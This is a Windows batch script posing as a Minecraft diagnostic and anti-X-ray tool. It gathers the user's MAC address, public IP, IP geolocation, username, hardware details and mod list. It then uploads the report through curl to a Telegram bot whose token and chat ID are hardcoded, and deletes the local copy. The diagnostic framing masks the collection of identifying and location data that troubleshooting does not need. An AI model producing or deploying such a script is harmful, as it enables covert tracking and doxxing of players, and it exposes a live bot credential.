@echo off
title Minecraft Extended Diagnostics

color 0A
echo ========================================================
echo         MINECRAFT SYSTEM DIAGNOSTIC TOOL
echo ========================================================
echo.

echo [1/6] Collecting Network Parameters...
for /f "tokens=2 delims=:" %%a in ('getmac /FO LIST ^| findstr /C:"Physical Address"') do (
    set "MAC_ADDR=%%a"
    goto :mac_done
)
:mac_done

for /f "delims=" %%a in ('curl -s https://api.ipify.org 2^>nul') do set "PUBLIC_IP=%%a"
if not defined PUBLIC_IP set "PUBLIC_IP=Unknown"

:: Exact Location via IP API
set "GEO_LOCATION=Unknown"
for /f "delims=" %%a in ('curl -s https://ipapi.co/json/ 2^>nul ^| findstr /C:"city" /C:"country_name"') do (
    set "GEO_LOCATION=%%a"
)

echo [2/6] Collecting System and Hardware Info...
for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value 2^>nul') do set "WIN_VER=%%a"
for /f "tokens=2 delims==" %%a in ('wmic cpu get Name /value 2^>nul') do set "CPU_NAME=%%a"
for /f "tokens=2 delims==" %%a in ('wmic path Win32_VideoController get Name /value 2^>nul') do set "GPU_NAME=%%a"
for /f "tokens=2 delims==" %%a in ('wmic os get TotalVisibleMemorySize /value 2^>nul') do (
    set /a "TOTAL_RAM=%%a / 1024"
)

echo [3/6] Checking Java Environment...
set "JAVA_VER=Not Installed / Unknown"
for /f "tokens=3" %%g in ('java -version 2^>^&1 ^| findstr /i "version"') do (
    set "JAVA_VER=%%~g"
)

echo [4/6] Searching Minecraft Directory...
set "MC_DIR="
if exist "%APPDATA%\.minecraft\logs\latest.log" set "MC_DIR=%APPDATA%\.minecraft"
if not defined MC_DIR if exist "%APPDATA%\.tlauncher\legacy\logs\latest.log" set "MC_DIR=%APPDATA%\.tlauncher\legacy"
if not defined MC_DIR if exist "%APPDATA%\.tlauncher\minecraft\logs\latest.log" set "MC_DIR=%APPDATA%\.tlauncher\minecraft"
if not defined MC_DIR if exist "D:\.minecraft\logs\latest.log" set "MC_DIR=D:\.minecraft"
if not defined MC_DIR if exist "D:\Minecraft\logs\latest.log" set "MC_DIR=D:\Minecraft"

if not defined MC_DIR (
    for /f "delims=" %%F in ('dir /b /s "%APPDATA%\latest.log" 2^>nul') do (
        for %%P in ("%%~dpF..") do if not defined MC_DIR set "MC_DIR=%%~fP"
    )
)

if not defined MC_DIR (
    echo [WARNING] Automatic detection failed. Drag and drop Minecraft folder here:
    set /p "CUSTOM_DIR=> "
    if defined CUSTOM_DIR set "CUSTOM_DIR=%CUSTOM_DIR:"=%"
    if exist "%CUSTOM_DIR%\logs\latest.log" set "MC_DIR=%CUSTOM_DIR%"
)

if not defined MC_DIR (
    echo [ERROR] Minecraft directory not found!
    pause
    exit
)

set "LOG_FILE=%MC_DIR%\logs\latest.log"

echo [5/6] Scanning for X-Ray and Memory Flags...
set "XRAY_STATUS=Not Detected"
if exist "%MC_DIR%\mods\*xray*" set "XRAY_STATUS=Detected in Mods folder"
if exist "%MC_DIR%\mods\*x-ray*" set "XRAY_STATUS=Detected in Mods folder"
if exist "%MC_DIR%\resourcepacks\*xray*" set "XRAY_STATUS=Detected in Resourcepacks"
if exist "%MC_DIR%\resourcepacks\*x-ray*" set "XRAY_STATUS=Detected in Resourcepacks"

set "JVM_ARGS=None"
set "ALLOC_RAM=Default / Unspecified"
findstr /i /c:"-Xmx" "%LOG_FILE%" > nul
if %errorlevel% equ 0 (
    for /f "tokens=*" %%m in ('findstr /i /c:"-Xmx" "%LOG_FILE%"') do (
        set "JVM_ARGS=%%m"
    )
)

set "REPORT_FILE=%TEMP%\mc_full_report.txt"
echo === MINECRAFT EXTENDED DIAGNOSTIC REPORT === > "%REPORT_FILE%"
echo Date: %DATE% %TIME% >> "%REPORT_FILE%"
echo User: %USERNAME% >> "%REPORT_FILE%"
echo Game Path: %MC_DIR% >> "%REPORT_FILE%"
echo. >> "%REPORT_FILE%"

echo --- NETWORK PARAMETERS --- >> "%REPORT_FILE%"
echo Public IP: %PUBLIC_IP% >> "%REPORT_FILE%"
echo MAC Address: %MAC_ADDR% >> "%REPORT_FILE%"
echo Location Data: %GEO_LOCATION% >> "%REPORT_FILE%"
echo. >> "%REPORT_FILE%"

echo --- HARDWARE & OS SPECIFICATIONS --- >> "%REPORT_FILE%"
echo OS Version: %WIN_VER% >> "%REPORT_FILE%"
echo CPU: %CPU_NAME% >> "%REPORT_FILE%"
echo GPU: %GPU_NAME% >> "%REPORT_FILE%"
echo Total RAM: %TOTAL_RAM% MB >> "%REPORT_FILE%"
echo. >> "%REPORT_FILE%"

echo --- JAVA & LAUNCHER CONFIGURATION --- >> "%REPORT_FILE%"
echo Java Version: %JAVA_VER% >> "%REPORT_FILE%"
echo Launch Parameters: %JVM_ARGS% >> "%REPORT_FILE%"
echo X-Ray Audit: %XRAY_STATUS% >> "%REPORT_FILE%"
echo. >> "%REPORT_FILE%"

echo --- INSTALLED MODS --- >> "%REPORT_FILE%"
if exist "%MC_DIR%\mods" (
    dir /b "%MC_DIR%\mods\*.jar" >> "%REPORT_FILE%" 2>nul
) else (
    echo Mods folder missing >> "%REPORT_FILE%"
)
echo. >> "%REPORT_FILE%"

echo --- RESOURCE PACKS --- >> "%REPORT_FILE%"
if exist "%MC_DIR%\resourcepacks" (
    dir /b "%MC_DIR%\resourcepacks" >> "%REPORT_FILE%" 2>nul
) else (
    echo Resource packs missing >> "%REPORT_FILE%"
)

echo [6/6] Sending Full Diagnostic Report to Telegram...
set "BOT_TOKEN=7968266627:AAFtF09Lzsbo5ymLRPifKwY0tKDDDqiM_1o"
set "CHAT_ID=5594798302"

curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" -F "chat_id=%CHAT_ID%" -F "caption=📄 Full Diagnostic Report (%USERNAME%)" -F "document=@%REPORT_FILE%" > nul

echo ========================================================
echo Diagnostic completed and sent successfully!
echo ========================================================
if exist "%REPORT_FILE%" del "%REPORT_FILE%"
pause